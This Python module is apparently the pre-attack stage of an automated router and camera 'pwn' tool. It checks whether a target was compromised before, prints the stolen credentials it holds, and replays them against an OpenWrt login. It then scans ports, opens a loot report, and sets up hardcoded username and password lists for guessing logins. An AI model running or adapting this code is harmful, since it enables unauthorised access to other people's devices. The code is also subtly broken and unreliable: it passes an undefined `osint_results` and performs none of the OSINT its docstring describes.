"""Pre-attack: history check, OSINT, port discovery, loot setup."""

from __future__ import annotations

import os
from urllib.parse import urlparse

from engines.auto_pwn.session import AttackSession
from engines.browser_automation import BrowserAutomation
from engines.hikvision_snapshots import DEFAULT_PASSWORD
from engines.loot_report import LootReport
from engines.scanner import Scanner
from engines.utils import (
    extract_credentials,
    extract_ip,
    get_target_data,
    log,
)


def check_previous_pwn(ip: str) -> bool:
    """Return False if user aborts; True to continue with attack."""
    old_data = get_target_data(ip)
    if old_data["status"] != "PWNED":
        return True

    print("\n" + "!" * 50)
    log(f"WARNING: TARGET {ip} PREVIOUSLY PWNED!", "SUCCESS")
    for svc in old_data["pwned_services"]:
        print(f"   [>] Found {svc['service']}: {svc['creds']}")
    print("!" * 50 + "\n")

    if os.environ.get("AUTOPWN_GUI") == "1":
        from gui.bridge.input_bridge import install_gui_bridge

        install_gui_bridge()
    choice = input("[?] Try existing credentials to log in? (y/n): ").strip().lower()
    if choice != "y":
        log("Skipping validation. Starting rescan...", "INFO")
        return True

    log("Attempting validation with stored credentials...", "INFO")
    stored_passwords = []
    for svc in old_data["pwned_services"]:
        creds = svc["creds"]
        if "Password: " in creds:
            stored_passwords.append(creds.split("Password: ")[-1])

    automation = BrowserAutomation()
    for pw in stored_passwords:
        res = automation.auto_login_openwrt(f"http://{ip}", pw)
        if res is True:
            log(f"STILL PWNED! Password '{pw}' still works. Access granted.", "SUCCESS")
            return False
        if res == "RATE_LIMITED":
            log("Aborting further credential tests due to rate limiting.", "ERROR")
            break

    log("Credential validation failed or was blocked.", "ERROR")
    choice = input("\n[?] Stored credentials failed/locked. Proceed to full attack phase? (y/n): ").strip().lower()
    if choice != "y":
        log("Exiting. No changes made.", "INFO")
        return False
    log("Starting full attack phase to recover the NEW password...", "WARNING")
    return True


def _url_port(target_input: str) -> int | None:
    try:
        parsed = urlparse(target_input if "://" in target_input else f"http://{target_input}")
        return parsed.port
    except Exception:
        return None


def build_session(
    target_input: str,
    manual_mode: bool = False,
    known_open_ports: list | None = None,
) -> AttackSession | None:
    ip = extract_ip(target_input)
    if not ip:
        log("Invalid IP/URL provided.", "ERROR")
        return None

    if not check_previous_pwn(ip):
        return None

    scanner = Scanner()
    if known_open_ports:
        live_open_ports = sorted({int(p) for p in known_open_ports if p})
        log(f"Using {len(live_open_ports)} open port(s) from LAN nmap scan.", "INFO")
    else:
        live_open_ports = scanner.discover_ports(ip)

    open_ports = list(live_open_ports)
    url_port = _url_port(target_input)
    if url_port and url_port not in open_ports:
        open_ports.insert(0, url_port)

    loot = LootReport(ip)
    loot.open_ports = open_ports

    all_passwords = ["QwEzxc321!@#", "Asdasd12", "12345", DEFAULT_PASSWORD]
    all_users = ["admin", "root", "dbadmin", "ubuntu"]
    u_url, p_url = extract_credentials(target_input)
    if u_url:
        all_users.insert(0, u_url)
    if p_url:
        all_passwords.insert(0, p_url)

    if not open_ports:
        log(f"No common web ports found open on {ip}. Trying default port 80.", "INFO")
        open_ports = [80]
    elif 80 not in open_ports:
        open_ports.insert(0, 80)

    return AttackSession(
        ip=ip,
        target_input=target_input,
        manual_mode=manual_mode,
        open_ports=open_ports,
        loot=loot,
        all_users=all_users,
        all_passwords=all_passwords,
        scanner=scanner,
        osint_results=osint_results,
    )
